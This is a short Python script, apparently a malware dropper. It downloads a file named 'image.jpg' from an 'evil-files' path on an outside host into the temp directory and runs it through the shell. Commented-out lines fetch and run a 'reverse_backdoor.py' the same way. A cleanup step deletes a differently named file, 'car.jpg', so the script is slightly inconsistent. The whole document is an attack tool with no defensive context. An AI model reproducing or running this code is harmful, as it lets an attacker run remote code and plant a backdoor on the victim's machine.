import os, requests, subprocess, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download('http://10.38.1.110/evil-files/image.jpg')
subprocess.Popen('image.jpg', shell=True)

# download('http://10.38.1.110/evil-files/reverse_backdoor.py')
# subprocess.call('reverse_backdoor.py', shell=True)

os.remove('car.jpg')
# os.remove('reverse_backdoor.py')